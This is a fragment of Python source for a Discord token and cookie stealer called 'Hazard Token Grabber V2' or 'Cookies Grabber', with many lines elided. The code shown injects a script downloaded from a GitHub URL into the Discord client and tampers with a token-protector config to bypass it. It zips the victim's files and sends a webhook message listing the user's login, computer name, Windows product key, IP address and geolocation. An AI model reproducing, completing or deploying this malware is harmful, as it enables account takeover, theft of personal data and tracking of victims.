...
class Hazard_Token_Grabber_V2:
    def __init__(self):
        ...
        self.tempfolder = os.getenv("temp")+"\\Cookies_Grabber"
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    ...
                    try:
                        ...
                        pass
                    f = requests.get("https://raw.githubusercontent.com/testy65421/yarp/main/clean.py").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def bypassTokenProtector(self):
        ...
        try:
            ...
            with open(config, 'a') as f:
                f.write("\n\n//Cookies just shit on this token protector")
        except Exception:
            pass
    ...
    def SendInfo(self):
        ...
        try:
            ...
            pass
        _zipfile = os.path.join(self.appdata, f'Cookies Grabber-[{os.getlogin()}].zip')
        ...
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/947224575622676520/947640543171731466/egrthfgh.gif",
            "embeds": [
                {
                    "author": {
                        "name": "Cookies Grabber",
                        "url": "http://cookiesservices.xyz",
                        "icon_url": "https://cdn.discordapp.com/attachments/947224575622676520/947640493184000040/Pfp.gif"
                    },
                    "description": f'**{os.getlogin()}** Just ran Cookies Grabber\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/947224575622676520/947640493184000040/Pfp.gif"
                    },       
